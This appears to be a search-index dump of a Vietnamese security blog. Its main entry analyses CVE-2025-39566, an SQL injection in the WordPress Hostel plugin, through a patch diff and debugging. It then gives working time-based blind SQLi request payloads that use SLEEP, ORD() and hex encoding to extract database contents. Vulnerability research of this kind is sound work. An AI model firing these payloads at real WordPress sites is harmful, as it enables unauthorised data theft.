ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng 